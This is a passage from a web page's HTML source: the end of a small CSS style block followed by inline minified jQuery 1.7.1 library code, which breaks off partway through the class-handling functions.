            .spaced-top { margin: 15px 0 0 0; }
            .spaced-bottom { margin: 0 0 15px 0; }

            .configure { margin: 20px; }
            .configure .variable { color: #d33682; }
            .configure p, .configure ul { margin: 5px 0 0 0; }
        </style>
        <!-- javascript -->
        <script>/*! jQuery v1.7.1 jquery.com | jquery.org/license */
            (function(a,b){function cy(a){return f.isWindow(a)?a:a.nodeType===9?a.defaultView||a.parentWindow:!1}function cv(a){if(!ck[a]){var b=c.body,d=f("<"+a+">").appendTo(b),e=d.css("display");d.remove();if(e==="none"||e===""){cl||(cl=c.createElement("iframe"),cl.frameBorder=cl.width=cl.height=0),b.appendChild(cl);if(!cm||!cl.createElement)cm=(cl.contentWindow||cl.contentDocument).document,cm.write((c.compatMode==="CSS1Compat"?"<!doctype html>":"")+"<html><body>"),cm.close();d=cm.createElement(a),cm.body.appendChild(d),e=f.css(d,"display"),b.removeChild(cl)}ck[a]=e}return ck[a]}function cu(a,b){var c={};f.each(cq.concat.apply([],cq.slice(0,b)),function(){c[this]=a});return c}function ct(){cr=b}function cs(){setTimeout(ct,0);return cr=f.now()}function cj(){try{return new a.ActiveXObject("Microsoft.XMLHTTP")}catch(b){}}function ci(){try{return new a.XMLHttpRequest}catch(b){}}function cc(a,c){a.dataFilter&&(c=a.dataFilter(c,a.dataType));var d=a.dataTypes,e={},g,h,i=d.length,j,k=d[0],l,m,n,o,p;for(g=1;g<i;g++){if(g===1)for(h in a.converters)typeof h=="string"&&(e[h.toLowerCase()]=a.converters[h]);l=k,k=d[g];if(k==="*")k=l;else if(l!=="*"&&l!==k){m=l+" "+k,n=e[m]||e["* "+k];if(!n){p=b;for(o in e){j=o.split(" ");if(j[0]===l||j[0]==="*"){p=e[j[1]+" "+k];if(p){o=e[o],o===!0?n=p:p===!0&&(n=o);break}}}}!n&&!p&&f.error("No conversion from "+m.replace(" "," to ")),n!==!0&&(c=n?n(c):p(o(c)))}}return c}function cb(a,c,d){var e=a.contents,f=a.dataTypes,g=a.responseFields,h,i,j,k;for(i in g)i in d&&(c[g[i]]=d[i]);while(f[0]==="*")f.shift(),h===b&&(h=a.mimeType||c.getResponseHeader("content-type"));if(h)for(i in e)if(e[i]&&e[i].test(h)){f.unshift(i);break}if(f[0]in d)j=f[0];else{for(i in d){if(!f[0]||a.converters[i+" "+f[0]]){j=i;break}k||(k=i)}j=j||k}if(j){j!==f[0]&&f.unshift(j);return d[j]}}function ca(a,b,c,d){if(f.isArray(b))f.each(b,function(b,e){c||bE.test(a)?d(a,e):ca(a+"["+(typeof e=="object"||f.isArray(e)?b:"")+"]",e,c,d)});else if(!c&&b!=null&&typeof b=="object")for(var e in b)ca(a+"["+e+"]",b[e],c,d);else d(a,b)}function b_(a,c){var d,e,g=f.ajaxSettings.flatOptions||{};for(d in c)c[d]!==b&&((g[d]?a:e||(e={}))[d]=c[d]);e&&f.extend(!0,a,e)}function b$(a,c,d,e,f,g){f=f||c.dataTypes[0],g=g||{},g[f]=!0;var h=a[f],i=0,j=h?h.length:0,k=a===bT,l;for(;i<j&&(k||!l);i++)l=h[i](c,d,e),typeof l=="string"&&(!k||g[l]?l=b:(c.dataTypes.unshift(l),l=b$(a,c,d,e,l,g)));(k||!l)&&!g["*"]&&(l=b$(a,c,d,e,"*",g));return l}function bZ(a){return function(b,c){typeof b!="string"&&(c=b,b="*");if(f.isFunction(c)){var d=b.toLowerCase().split(bP),e=0,g=d.length,h,i,j;for(;e<g;e++)h=d[e],j=/^\+/.test(h),j&&(h=h.substr(1)||"*"),i=a[h]=a[h]||[],i[j?"unshift":"push"](c)}}}function bC(a,b,c){var d=b==="width"?a.offsetWidth:a.offsetHeight,e=b==="width"?bx:by,g=0,h=e.length;if(d>0){if(c!=="border")for(;g<h;g++)c||(d-=parseFloat(f.css(a,"padding"+e[g]))||0),c==="margin"?d+=parseFloat(f.css(a,c+e[g]))||0:d-=parseFloat(f.css(a,"border"+e[g]+"Width"))||0;return d+"px"}d=bz(a,b,b);if(d<0||d==null)d=a.style[b]||0;d=parseFloat(d)||0;if(c)for(;g<h;g++)d+=parseFloat(f.css(a,"padding"+e[g]))||0,c!=="padding"&&(d+=parseFloat(f.css(a,"border"+e[g]+"Width"))||0),c==="margin"&&(d+=parseFloat(f.css(a,c+e[g]))||0);return d+"px"}function bp(a,b){b.src?f.ajax({url:b.src,async:!1,dataType:"script"}):f.globalEval((b.text||b.textContent||b.innerHTML||"").replace(bf,"/*$0*/")),b.parentNode&&b.parentNode.removeChild(b)}function bo(a){var b=c.createElement("div");bh.appendChild(b),b.innerHTML=a.outerHTML;return b.firstChild}function bn(a){var b=(a.nodeName||"").toLowerCase();b==="input"?bm(a):b!=="script"&&typeof a.getElementsByTagName!="undefined"&&f.grep(a.getElementsByTagName("input"),bm)}function bm(a){if(a.type==="checkbox"||a.type==="radio")a.defaultChecked=a.checked}function bl(a){return typeof a.getElementsByTagName!="undefined"?a.getElementsByTagName("*"):typeof a.querySelectorAll!="undefined"?a.querySelectorAll("*"):[]}function bk(a,b){var c;if(b.nodeType===1){b.clearAttributes&&b.clearAttributes(),b.mergeAttributes&&b.mergeAttributes(a),c=b.nodeName.toLowerCase();if(c==="object")b.outerHTML=a.outerHTML;else if(c!=="input"||a.type!=="checkbox"&&a.type!=="radio"){if(c==="option")b.selected=a.defaultSelected;else if(c==="input"||c==="textarea")b.defaultValue=a.defaultValue}else a.checked&&(b.defaultChecked=b.checked=a.checked),b.value!==a.value&&(b.value=a.value);b.removeAttribute(f.expando)}}function bj(a,b){if(b.nodeType===1&&!!f.hasData(a)){var c,d,e,g=f._data(a),h=f._data(b,g),i=g.events;if(i){delete h.handle,h.events={};for(c in i)for(d=0,e=i[c].length;d<e;d++)f.event.add(b,c+(i[c][d].namespace?".":"")+i[c][d].namespace,i[c][d],i[c][d].data)}h.data&&(h.data=f.extend({},h.data))}}function bi(a,b){return f.nodeName(a,"table")?a.getElementsByTagName("tbody")[0]||a.appendChild(a.ownerDocument.createElement("tbody")):a}function U(a){var b=V.split("|"),c=a.createDocumentFragment();if(c.createElement)while(b.length)c.createElement(b.pop());return c}function T(a,b,c){b=b||0;if(f.isFunction(b))return f.grep(a,function(a,d){var e=!!b.call(a,d,a);return e===c});if(b.nodeType)return f.grep(a,function(a,d){return a===b===c});if(typeof b=="string"){var d=f.grep(a,function(a){return a.nodeType===1});if(O.test(b))return f.filter(b,d,!c);b=f.filter(b,d)}return f.grep(a,function(a,d){return f.inArray(a,b)>=0===c})}function S(a){return!a||!a.parentNode||a.parentNode.nodeType===11}function K(){return!0}function J(){return!1}function n(a,b,c){var d=b+"defer",e=b+"queue",g=b+"mark",h=f._data(a,d);h&&(c==="queue"||!f._data(a,e))&&(c==="mark"||!f._data(a,g))&&setTimeout(function(){!f._data(a,e)&&!f._data(a,g)&&(f.removeData(a,d,!0),h.fire())},0)}function m(a){for(var b in a){if(b==="data"&&f.isEmptyObject(a[b]))continue;if(b!=="toJSON")return!1}return!0}function l(a,c,d){if(d===b&&a.nodeType===1){var e="data-"+c.replace(k,"-$1").toLowerCase();d=a.getAttribute(e);if(typeof d=="string"){try{d=d==="true"?!0:d==="false"?!1:d==="null"?null:f.isNumeric(d)?parseFloat(d):j.test(d)?f.parseJSON(d):d}catch(g){}f.data(a,c,d)}else d=b}return d}function h(a){var b=g[a]={},c,d;a=a.split(/\s+/);for(c=0,d=a.length;c<d;c++)b[a[c]]=!0;return b}var c=a.document,d=a.navigator,e=a.location,f=function(){function J(){if(!e.isReady){try{c.documentElement.doScroll("left")}catch(a){setTimeout(J,1);return}e.ready()}}var e=function(a,b){return new e.fn.init(a,b,h)},f=a.jQuery,g=a.$,h,i=/^(?:[^#<]*(<[\w\W]+>)[^>]*$|#([\w\-]*)$)/,j=/\S/,k=/^\s+/,l=/\s+$/,m=/^<(\w+)\s*\/?>(?:<\/\1>)?$/,n=/^[\],:{}\s]*$/,o=/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,p=/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,q=/(?:^|:|,)(?:\s*\[)+/g,r=/(webkit)[ \/]([\w.]+)/,s=/(opera)(?:.*version)?[ \/]([\w.]+)/,t=/(msie) ([\w.]+)/,u=/(mozilla)(?:.*? rv:([\w.]+))?/,v=/-([a-z]|[0-9])/ig,w=/^-ms-/,x=function(a,b){return(b+"").toUpperCase()},y=d.userAgent,z,A,B,C=Object.prototype.toString,D=Object.prototype.hasOwnProperty,E=Array.prototype.push,F=Array.prototype.slice,G=String.prototype.trim,H=Array.prototype.indexOf,I={};e.fn=e.prototype={constructor:e,init:function(a,d,f){var g,h,j,k;if(!a)return this;if(a.nodeType){this.context=this[0]=a,this.length=1;return this}if(a==="body"&&!d&&c.body){this.context=c,this[0]=c.body,this.selector=a,this.length=1;return this}if(typeof a=="string"){a.charAt(0)!=="<"||a.charAt(a.length-1)!==">"||a.length<3?g=i.exec(a):g=[null,a,null];if(g&&(g[1]||!d)){if(g[1]){d=d instanceof e?d[0]:d,k=d?d.ownerDocument||d:c,j=m.exec(a),j?e.isPlainObject(d)?(a=[c.createElement(j[1])],e.fn.attr.call(a,d,!0)):a=[k.createElement(j[1])]:(j=e.buildFragment([g[1]],[k]),a=(j.cacheable?e.clone(j.fragment):j.fragment).childNodes);return e.merge(this,a)}h=c.getElementById(g[2]);if(h&&h.parentNode){if(h.id!==g[2])return f.find(a);this.length=1,this[0]=h}this.context=c,this.selector=a;return this}return!d||d.jquery?(d||f).find(a):this.constructor(d).find(a)}if(e.isFunction(a))return f.ready(a);a.selector!==b&&(this.selector=a.selector,this.context=a.context);return e.makeArray(a,this)},selector:"",jquery:"1.7.1",length:0,size:function(){return this.length},toArray:function(){return F.call(this,0)},get:function(a){return a==null?this.toArray():a<0?this[this.length+a]:this[a]},pushStack:function(a,b,c){var d=this.constructor();e.isArray(a)?E.apply(d,a):e.merge(d,a),d.prevObject=this,d.context=this.context,b==="find"?d.selector=this.selector+(this.selector?" ":"")+c:b&&(d.selector=this.selector+"."+b+"("+c+")");return d},each:function(a,b){return e.each(this,a,b)},ready:function(a){e.bindReady(),A.add(a);return this},eq:function(a){a=+a;return a===-1?this.slice(a):this.slice(a,a+1)},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},slice:function(){return this.pushStack(F.apply(this,arguments),"slice",F.call(arguments).join(","))},map:function(a){return this.pushStack(e.map(this,function(b,c){return a.call(b,c,b)}))},end:function(){return this.prevObject||this.constructor(null)},push:E,sort:[].sort,splice:[].splice},e.fn.init.prototype=e.fn,e.extend=e.fn.extend=function(){var a,c,d,f,g,h,i=arguments[0]||{},j=1,k=arguments.length,l=!1;typeof i=="boolean"&&(l=i,i=arguments[1]||{},j=2),typeof i!="object"&&!e.isFunction(i)&&(i={}),k===j&&(i=this,--j);for(;j<k;j++)if((a=arguments[j])!=null)for(c in a){d=i[c],f=a[c];if(i===f)continue;l&&f&&(e.isPlainObject(f)||(g=e.isArray(f)))?(g?(g=!1,h=d&&e.isArray(d)?d:[]):h=d&&e.isPlainObject(d)?d:{},i[c]=e.extend(l,h,f)):f!==b&&(i[c]=f)}return i},e.extend({noConflict:function(b){a.$===e&&(a.$=g),b&&a.jQuery===e&&(a.jQuery=f);return e},isReady:!1,readyWait:1,holdReady:function(a){a?e.readyWait++:e.ready(!0)},ready:function(a){if(a===!0&&!--e.readyWait||a!==!0&&!e.isReady){if(!c.body)return setTimeout(e.ready,1);e.isReady=!0;if(a!==!0&&--e.readyWait>0)return;A.fireWith(c,[e]),e.fn.trigger&&e(c).trigger("ready").off("ready")}},bindReady:function(){if(!A){A=e.Callbacks("once memory");if(c.readyState==="complete")return setTimeout(e.ready,1);if(c.addEventListener)c.addEventListener("DOMContentLoaded",B,!1),a.addEventListener("load",e.ready,!1);else if(c.attachEvent){c.attachEvent("onreadystatechange",B),a.attachEvent("onload",e.ready);var b=!1;try{b=a.frameElement==null}catch(d){}c.documentElement.doScroll&&b&&J()}}},isFunction:function(a){return e.type(a)==="function"},isArray:Array.isArray||function(a){return e.type(a)==="array"},isWindow:function(a){return a&&typeof a=="object"&&"setInterval"in a},isNumeric:function(a){return!isNaN(parseFloat(a))&&isFinite(a)},type:function(a){return a==null?String(a):I[C.call(a)]||"object"},isPlainObject:function(a){if(!a||e.type(a)!=="object"||a.nodeType||e.isWindow(a))return!1;try{if(a.constructor&&!D.call(a,"constructor")&&!D.call(a.constructor.prototype,"isPrototypeOf"))return!1}catch(c){return!1}var d;for(d in a);return d===b||D.call(a,d)},isEmptyObject:function(a){for(var b in a)return!1;return!0},error:function(a){throw new Error(a)},parseJSON:function(b){if(typeof b!="string"||!b)return null;b=e.trim(b);if(a.JSON&&a.JSON.parse)return a.JSON.parse(b);if(n.test(b.replace(o,"@").replace(p,"]").replace(q,"")))return(new Function("return "+b))();e.error("Invalid JSON: "+b)},parseXML:function(c){var d,f;try{a.DOMParser?(f=new DOMParser,d=f.parseFromString(c,"text/xml")):(d=new ActiveXObject("Microsoft.XMLDOM"),d.async="false",d.loadXML(c))}catch(g){d=b}(!d||!d.documentElement||d.getElementsByTagName("parsererror").length)&&e.error("Invalid XML: "+c);return d},noop:function(){},globalEval:function(b){b&&j.test(b)&&(a.execScript||function(b){a.eval.call(a,b)})(b)},camelCase:function(a){return a.replace(w,"ms-").replace(v,x)},nodeName:function(a,b){return a.nodeName&&a.nodeName.toUpperCase()===b.toUpperCase()},each:function(a,c,d){var f,g=0,h=a.length,i=h===b||e.isFunction(a);if(d){if(i){for(f in a)if(c.apply(a[f],d)===!1)break}else for(;g<h;)if(c.apply(a[g++],d)===!1)break}else if(i){for(f in a)if(c.call(a[f],f,a[f])===!1)break}else for(;g<h;)if(c.call(a[g],g,a[g++])===!1)break;return a},trim:G?function(a){return a==null?"":G.call(a)}:function(a){return a==null?"":(a+"").replace(k,"").replace(l,"")},makeArray:function(a,b){var c=b||[];if(a!=null){var d=e.type(a);a.length==null||d==="string"||d==="function"||d==="regexp"||e.isWindow(a)?E.call(c,a):e.merge(c,a)}return c},inArray:function(a,b,c){var d;if(b){if(H)return H.call(b,a,c);d=b.length,c=c?c<0?Math.max(0,d+c):c:0;for(;c<d;c++)if(c in b&&b[c]===a)return c}return-1},merge:function(a,c){var d=a.length,e=0;if(typeof c.length=="number")for(var f=c.length;e<f;e++)a[d++]=c[e];else while(c[e]!==b)a[d++]=c[e++];a.length=d;return a},grep:function(a,b,c){var d=[],e;c=!!c;for(var f=0,g=a.length;f<g;f++)e=!!b(a[f],f),c!==e&&d.push(a[f]);return d},map:function(a,c,d){var f,g,h=[],i=0,j=a.length,k=a instanceof e||j!==b&&typeof j=="number"&&(j>0&&a[0]&&a[j-1]||j===0||e.isArray(a));if(k)for(;i<j;i++)f=c(a[i],i,d),f!=null&&(h[h.length]=f);else for(g in a)f=c(a[g],g,d),f!=null&&(h[h.length]=f);return h.concat.apply([],h)},guid:1,proxy:function(a,c){if(typeof c=="string"){var d=a[c];c=a,a=d}if(!e.isFunction(a))return b;var f=F.call(arguments,2),g=function(){return a.apply(c,f.concat(F.call(arguments)))};g.guid=a.guid=a.guid||g.guid||e.guid++;return g},access:function(a,c,d,f,g,h){var i=a.length;if(typeof c=="object"){for(var j in c)e.access(a,j,c[j],f,g,d);return a}if(d!==b){f=!h&&f&&e.isFunction(d);for(var k=0;k<i;k++)g(a[k],c,f?d.call(a[k],k,g(a[k],c)):d,h);return a}return i?g(a[0],c):b},now:function(){return(new Date).getTime()},uaMatch:function(a){a=a.toLowerCase();var b=r.exec(a)||s.exec(a)||t.exec(a)||a.indexOf("compatible")<0&&u.exec(a)||[];return{browser:b[1]||"",version:b[2]||"0"}},sub:function(){function a(b,c){return new a.fn.init(b,c)}e.extend(!0,a,this),a.superclass=this,a.fn=a.prototype=this(),a.fn.constructor=a,a.sub=this.sub,a.fn.init=function(d,f){f&&f instanceof e&&!(f instanceof a)&&(f=a(f));return e.fn.init.call(this,d,f,b)},a.fn.init.prototype=a.fn;var b=a(c);return a},browser:{}}),e.each("Boolean Number String Function Array Date RegExp Object".split(" "),function(a,b){I["[object "+b+"]"]=b.toLowerCase()}),z=e.uaMatch(y),z.browser&&(e.browser[z.browser]=!0,e.browser.version=z.version),e.browser.webkit&&(e.browser.safari=!0),j.test(" ")&&(k=/^[\s\xA0]+/,l=/[\s\xA0]+$/),h=e(c),c.addEventListener?B=function(){c.removeEventListener("DOMContentLoaded",B,!1),e.ready()}:c.attachEvent&&(B=function(){c.readyState==="complete"&&(c.detachEvent("onreadystatechange",B),e.ready())});return e}(),g={};f.Callbacks=function(a){a=a?g[a]||h(a):{};var c=[],d=[],e,i,j,k,l,m=function(b){var d,e,g,h,i;for(d=0,e=b.length;d<e;d++)g=b[d],h=f.type(g),h==="array"?m(g):h==="function"&&(!a.unique||!o.has(g))&&c.push(g)},n=function(b,f){f=f||[],e=!a.memory||[b,f],i=!0,l=j||0,j=0,k=c.length;for(;c&&l<k;l++)if(c[l].apply(b,f)===!1&&a.stopOnFalse){e=!0;break}i=!1,c&&(a.once?e===!0?o.disable():c=[]:d&&d.length&&(e=d.shift(),o.fireWith(e[0],e[1])))},o={add:function(){if(c){var a=c.length;m(arguments),i?k=c.length:e&&e!==!0&&(j=a,n(e[0],e[1]))}return this},remove:function(){if(c){var b=arguments,d=0,e=b.length;for(;d<e;d++)for(var f=0;f<c.length;f++)if(b[d]===c[f]){i&&f<=k&&(k--,f<=l&&l--),c.splice(f--,1);if(a.unique)break}}return this},has:function(a){if(c){var b=0,d=c.length;for(;b<d;b++)if(a===c[b])return!0}return!1},empty:function(){c=[];return this},disable:function(){c=d=e=b;return this},disabled:function(){return!c},lock:function(){d=b,(!e||e===!0)&&o.disable();return this},locked:function(){return!d},fireWith:function(b,c){d&&(i?a.once||d.push([b,c]):(!a.once||!e)&&n(b,c));return this},fire:function(){o.fireWith(this,arguments);return this},fired:function(){return!!e}};return o};var i=[].slice;f.extend({Deferred:function(a){var b=f.Callbacks("once memory"),c=f.Callbacks("once memory"),d=f.Callbacks("memory"),e="pending",g={resolve:b,reject:c,notify:d},h={done:b.add,fail:c.add,progress:d.add,state:function(){return e},isResolved:b.fired,isRejected:c.fired,then:function(a,b,c){i.done(a).fail(b).progress(c);return this},always:function(){i.done.apply(i,arguments).fail.apply(i,arguments);return this},pipe:function(a,b,c){return f.Deferred(function(d){f.each({done:[a,"resolve"],fail:[b,"reject"],progress:[c,"notify"]},function(a,b){var c=b[0],e=b[1],g;f.isFunction(c)?i[a](function(){g=c.apply(this,arguments),g&&f.isFunction(g.promise)?g.promise().then(d.resolve,d.reject,d.notify):d[e+"With"](this===i?d:this,[g])}):i[a](d[e])})}).promise()},promise:function(a){if(a==null)a=h;else for(var b in h)a[b]=h[b];return a}},i=h.promise({}),j;for(j in g)i[j]=g[j].fire,i[j+"With"]=g[j].fireWith;i.done(function(){e="resolved"},c.disable,d.lock).fail(function(){e="rejected"},b.disable,d.lock),a&&a.call(i,i);return i},when:function(a){function m(a){return function(b){e[a]=arguments.length>1?i.call(arguments,0):b,j.notifyWith(k,e)}}function l(a){return function(c){b[a]=arguments.length>1?i.call(arguments,0):c,--g||j.resolveWith(j,b)}}var b=i.call(arguments,0),c=0,d=b.length,e=Array(d),g=d,h=d,j=d<=1&&a&&f.isFunction(a.promise)?a:f.Deferred(),k=j.promise();if(d>1){for(;c<d;c++)b[c]&&b[c].promise&&f.isFunction(b[c].promise)?b[c].promise().then(l(c),j.reject,m(c)):--g;g||j.resolveWith(j,b)}else j!==a&&j.resolveWith(j,d?[a]:[]);return k}}),f.support=function(){var b,d,e,g,h,i,j,k,l,m,n,o,p,q=c.createElement("div"),r=c.documentElement;q.setAttribute("className","t"),q.innerHTML="   <link/><table></table><a href='/a' style='top:1px;float:left;opacity:.55;'>a</a><input type='checkbox'/>",d=q.getElementsByTagName("*"),e=q.getElementsByTagName("a")[0];if(!d||!d.length||!e)return{};g=c.createElement("select"),h=g.appendChild(c.createElement("option")),i=q.getElementsByTagName("input")[0],b={leadingWhitespace:q.firstChild.nodeType===3,tbody:!q.getElementsByTagName("tbody").length,htmlSerialize:!!q.getElementsByTagName("link").length,style:/top/.test(e.getAttribute("style")),hrefNormalized:e.getAttribute("href")==="/a",opacity:/^0.55/.test(e.style.opacity),cssFloat:!!e.style.cssFloat,checkOn:i.value==="on",optSelected:h.selected,getSetAttribute:q.className!=="t",enctype:!!c.createElement("form").enctype,html5Clone:c.createElement("nav").cloneNode(!0).outerHTML!=="<:nav></:nav>",submitBubbles:!0,changeBubbles:!0,focusinBubbles:!1,deleteExpando:!0,noCloneEvent:!0,inlineBlockNeedsLayout:!1,shrinkWrapBlocks:!1,reliableMarginRight:!0},i.checked=!0,b.noCloneChecked=i.cloneNode(!0).checked,g.disabled=!0,b.optDisabled=!h.disabled;try{delete q.test}catch(s){b.deleteExpando=!1}!q.addEventListener&&q.attachEvent&&q.fireEvent&&(q.attachEvent("onclick",function(){b.noCloneEvent=!1}),q.cloneNode(!0).fireEvent("onclick")),i=c.createElement("input"),i.value="t",i.setAttribute("type","radio"),b.radioValue=i.value==="t",i.setAttribute("checked","checked"),q.appendChild(i),k=c.createDocumentFragment(),k.appendChild(q.lastChild),b.checkClone=k.cloneNode(!0).cloneNode(!0).lastChild.checked,b.appendChecked=i.checked,k.removeChild(i),k.appendChild(q),q.innerHTML="",a.getComputedStyle&&(j=c.createElement("div"),j.style.width="0",j.style.marginRight="0",q.style.width="2px",q.appendChild(j),b.reliableMarginRight=(parseInt((a.getComputedStyle(j,null)||{marginRight:0}).marginRight,10)||0)===0);if(q.attachEvent)for(o in{submit:1,change:1,focusin:1})n="on"+o,p=n in q,p||(q.setAttribute(n,"return;"),p=typeof q[n]=="function"),b[o+"Bubbles"]=p;k.removeChild(q),k=g=h=j=q=i=null,f(function(){var a,d,e,g,h,i,j,k,m,n,o,r=c.getElementsByTagName("body")[0];!r||(j=1,k="position:absolute;top:0;left:0;width:1px;height:1px;margin:0;",m="visibility:hidden;border:0;",n="style='"+k+"border:5px solid #000;padding:0;'",o="<div "+n+"><div></div></div>"+"<table "+n+" cellpadding='0' cellspacing='0'>"+"<tr><td></td></tr></table>",a=c.createElement("div"),a.style.cssText=m+"width:0;height:0;position:static;top:0;margin-top:"+j+"px",r.insertBefore(a,r.firstChild),q=c.createElement("div"),a.appendChild(q),q.innerHTML="<table><tr><td style='padding:0;border:0;display:none'></td><td>t</td></tr></table>",l=q.getElementsByTagName("td"),p=l[0].offsetHeight===0,l[0].style.display="",l[1].style.display="none",b.reliableHiddenOffsets=p&&l[0].offsetHeight===0,q.innerHTML="",q.style.width=q.style.paddingLeft="1px",f.boxModel=b.boxModel=q.offsetWidth===2,typeof q.style.zoom!="undefined"&&(q.style.display="inline",q.style.zoom=1,b.inlineBlockNeedsLayout=q.offsetWidth===2,q.style.display="",q.innerHTML="<div style='width:4px;'></div>",b.shrinkWrapBlocks=q.offsetWidth!==2),q.style.cssText=k+m,q.innerHTML=o,d=q.firstChild,e=d.firstChild,h=d.nextSibling.firstChild.firstChild,i={doesNotAddBorder:e.offsetTop!==5,doesAddBorderForTableAndCells:h.offsetTop===5},e.style.position="fixed",e.style.top="20px",i.fixedPosition=e.offsetTop===20||e.offsetTop===15,e.style.position=e.style.top="",d.style.overflow="hidden",d.style.position="relative",i.subtractsBorderForOverflowNotVisible=e.offsetTop===-5,i.doesNotIncludeMarginInBodyOffset=r.offsetTop!==j,r.removeChild(a),q=a=null,f.extend(b,i))});return b}();var j=/^(?:\{.*\}|\[.*\])$/,k=/([A-Z])/g;f.extend({cache:{},uuid:0,expando:"jQuery"+(f.fn.jquery+Math.random()).replace(/\D/g,""),noData:{embed:!0,object:"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000",applet:!0},hasData:function(a){a=a.nodeType?f.cache[a[f.expando]]:a[f.expando];return!!a&&!m(a)},data:function(a,c,d,e){if(!!f.acceptData(a)){var g,h,i,j=f.expando,k=typeof c=="string",l=a.nodeType,m=l?f.cache:a,n=l?a[j]:a[j]&&j,o=c==="events";if((!n||!m[n]||!o&&!e&&!m[n].data)&&k&&d===b)return;n||(l?a[j]=n=++f.uuid:n=j),m[n]||(m[n]={},l||(m[n].toJSON=f.noop));if(typeof c=="object"||typeof c=="function")e?m[n]=f.extend(m[n],c):m[n].data=f.extend(m[n].data,c);g=h=m[n],e||(h.data||(h.data={}),h=h.data),d!==b&&(h[f.camelCase(c)]=d);if(o&&!h[c])return g.events;k?(i=h[c],i==null&&(i=h[f.camelCase(c)])):i=h;return i}},removeData:function(a,b,c){if(!!f.acceptData(a)){var d,e,g,h=f.expando,i=a.nodeType,j=i?f.cache:a,k=i?a[h]:h;if(!j[k])return;if(b){d=c?j[k]:j[k].data;if(d){f.isArray(b)||(b in d?b=[b]:(b=f.camelCase(b),b in d?b=[b]:b=b.split(" ")));for(e=0,g=b.length;e<g;e++)delete d[b[e]];if(!(c?m:f.isEmptyObject)(d))return}}if(!c){delete j[k].data;if(!m(j[k]))return}f.support.deleteExpando||!j.setInterval?delete j[k]:j[k]=null,i&&(f.support.deleteExpando?delete a[h]:a.removeAttribute?a.removeAttribute(h):a[h]=null)}},_data:function(a,b,c){return f.data(a,b,c,!0)},acceptData:function(a){if(a.nodeName){var b=f.noData[a.nodeName.toLowerCase()];if(b)return b!==!0&&a.getAttribute("classid")===b}return!0}}),f.fn.extend({data:function(a,c){var d,e,g,h=null;if(typeof a=="undefined"){if(this.length){h=f.data(this[0]);if(this[0].nodeType===1&&!f._data(this[0],"parsedAttrs")){e=this[0].attributes;for(var i=0,j=e.length;i<j;i++)g=e[i].name,g.indexOf("data-")===0&&(g=f.camelCase(g.substring(5)),l(this[0],g,h[g]));f._data(this[0],"parsedAttrs",!0)}}return h}if(typeof a=="object")return this.each(function(){f.data(this,a)});d=a.split("."),d[1]=d[1]?"."+d[1]:"";if(c===b){h=this.triggerHandler("getData"+d[1]+"!",[d[0]]),h===b&&this.length&&(h=f.data(this[0],a),h=l(this[0],a,h));return h===b&&d[1]?this.data(d[0]):h}return this.each(function(){var b=f(this),e=[d[0],c];b.triggerHandler("setData"+d[1]+"!",e),f.data(this,a,c),b.triggerHandler("changeData"+d[1]+"!",e)})},removeData:function(a){return this.each(function(){f.removeData(this,a)})}}),f.extend({_mark:function(a,b){a&&(b=(b||"fx")+"mark",f._data(a,b,(f._data(a,b)||0)+1))},_unmark:function(a,b,c){a!==!0&&(c=b,b=a,a=!1);if(b){c=c||"fx";var d=c+"mark",e=a?0:(f._data(b,d)||1)-1;e?f._data(b,d,e):(f.removeData(b,d,!0),n(b,c,"mark"))}},queue:function(a,b,c){var d;if(a){b=(b||"fx")+"queue",d=f._data(a,b),c&&(!d||f.isArray(c)?d=f._data(a,b,f.makeArray(c)):d.push(c));return d||[]}},dequeue:function(a,b){b=b||"fx";var c=f.queue(a,b),d=c.shift(),e={};d==="inprogress"&&(d=c.shift()),d&&(b==="fx"&&c.unshift("inprogress"),f._data(a,b+".run",e),d.call(a,function(){f.dequeue(a,b)},e)),c.length||(f.removeData(a,b+"queue "+b+".run",!0),n(a,b,"queue"))}}),f.fn.extend({queue:function(a,c){typeof a!="string"&&(c=a,a="fx");if(c===b)return f.queue(this[0],a);return this.each(function(){var b=f.queue(this,a,c);a==="fx"&&b[0]!=="inprogress"&&f.dequeue(this,a)})},dequeue:function(a){return this.each(function(){f.dequeue(this,a)})},delay:function(a,b){a=f.fx?f.fx.speeds[a]||a:a,b=b||"fx";return this.queue(b,function(b,c){var d=setTimeout(b,a);c.stop=function(){clearTimeout(d)}})},clearQueue:function(a){return this.queue(a||"fx",[])},promise:function(a,c){function m(){--h||d.resolveWith(e,[e])}typeof a!="string"&&(c=a,a=b),a=a||"fx";var d=f.Deferred(),e=this,g=e.length,h=1,i=a+"defer",j=a+"queue",k=a+"mark",l;while(g--)if(l=f.data(e[g],i,b,!0)||(f.data(e[g],j,b,!0)||f.data(e[g],k,b,!0))&&f.data(e[g],i,f.Callbacks("once memory"),!0))h++,l.add(m);m();return d.promise()}});var o=/[\n\t\r]/g,p=/\s+/,q=/\r/g,r=/^(?:button|input)$/i,s=/^(?:button|input|object|select|textarea)$/i,t=/^a(?:rea)?$/i,u=/^(?:autofocus|autoplay|async|checked|controls|defer|disabled|hidden|loop|multiple|open|readonly|required|scoped|selected)$/i,v=f.support.getSetAttribute,w,x,y;f.fn.extend({attr:function(a,b){return f.access(this,a,b,!0,f.attr)},removeAttr:function(a){return this.each(function(){f.removeAttr(this,a)})},prop:function(a,b){return f.access(this,a,b,!0,f.prop)},removeProp:function(a){a=f.propFix[a]||a;return this.each(function(){try{this[a]=b,delete this[a]}catch(c){}})},addClass:function(a){var b,c,d,e,g,h,i;if(f.isFunction(a))return this.each(function(b){f(this).addClass(a.call(this,b,this.className))});if(a&&typeof a=="string"){b=a.split(p);for(c=0,d=this.length;c<d;c++){e=this[c];if(e.nodeType===1)if(!e.className&&b.length===1)e.className=a;else{g=" "+e.className+" ";for(h=0,i=b.length;h<i;h++)~g.indexOf(" "+b[h]+" ")||(g+=b[h]+" ");e.className=f.trim(g)}}}return this},removeClass:function(a){var c,d,e,g,h,i,j;if(f.isFunction(a))return this.each(function(b){f(this).removeClass(a.call(this,b,this.className))});if(a&&typeof a=="string"||a===b){c=(a||"").split(p);for(d=0,e=this.length;d<e;d++){g=this[d];if(g.nodeType===1&&g.className)if(a){h=(" "+g.className+" ").replace(o," ");for(i=0,j=c.length;i<j;i++)h=h.replace(" "+c[i]+" "," ");g.className=f.trim(h)}else g.className=""}}return this},toggleClass:function(a,b){var c=typeof a,d=typeof b=="boolean";if(f.isFunction(a))return 